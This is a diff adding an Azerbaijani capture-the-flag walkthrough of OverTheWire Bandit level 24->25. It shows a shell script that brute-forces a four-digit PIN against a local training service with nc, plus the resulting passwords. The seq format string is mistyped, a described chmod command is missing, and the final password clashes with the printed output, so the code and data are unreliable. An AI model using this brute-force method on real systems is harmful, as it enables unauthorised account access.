@@ -791,3 +791,43 @@ UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
 ```
 - parolu copy edib çıxırıq `UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ`
 
+**Bandit [LEVEL 24->25](https://overthewire.org/wargames/bandit/bandit25.html)**
+![bandit leve24-25](https://i.imgur.com/KNYELn6.png)
+```
+ssh bandit.labs.overthewire.org -p 2220 -l bandit24
+```
+- `UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ`
+
+- Səviyyə 24 -> Səviyyə 25 səhifəsinə görə, bu Səviyyə bizi bruteforcing anlayışı ilə tanış edir. Bruteforcing o deməkdir ki, biz düzgün olanı əldə edənə qədər hər bir imkanı sınayırıq. Bunu əl ilə etmək yorucu və inanılmaz vaxt aparacaq, buna görə də, əlbəttə ki, bunun üçün bir skript yazacağıq:
+
+```
+vim /tmp/hackinganarchy.sh
+
+#!/bin/sh
+for i in `seq -f $04g 0 9999`;
+do
+echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i"
+done | nc localhost 30002
+```
+- Bu, “0000” və “9999” arasındakı bütün dəyərlərdən keçəcək, tələb olunduğu kimi onları Səviyyə 24 parolunun yanında çap edəcək və sonra onları 30002 portuna göndərəcək.
+
+- Seq əmri 0-dan 9999-a qədər olan nömrələrin siyahısını qaytarır, -f $04g parametri isə həmişə 4 simvol uzunluğunda olması üçün ona qabaqcıl sıfırları yazmağı əmr edir. Ətrafındakı "` "` onu əmr sətirinin özündən deyil, əmrin çıxışından istifadə etməyə imkan verir.
+
+- Əvvəlcə skripti icra edilə bilən hala gətirməliyik:
+- +x parametri sadəcə o deməkdir ki, biz özümüzə həmin skript üzərində icra edilə bilən hüquqlar veririk.
+
+- Sonra onu işə salırıq, lakin bir tutma(grep) ilə:
+
+```
+bandit24@bandit:/tmp$ ./hackinganarchy.sh | grep -v Wrong!
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+Correct!
+The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+```
+- Biz artıq əvvəlki səviyyələrdən grep əmrini bilirik. Lakin -v parametri ilə o, adətən etdiyinin əksini edir: Yalnız müəyyən sətirdən ibarət sətirləri çap etmək əvəzinə, yalnız həmin sətiri OLMAYAN sətirləri çap edir. Yanlış parol cəhdləri üçün çıxışı filtrləməyə kömək edir.
+
+
+
+- parolu copy edib çıxırıq `pIwrPrtPN36QITSp3EQaw936yaFoFgAB`
+
+
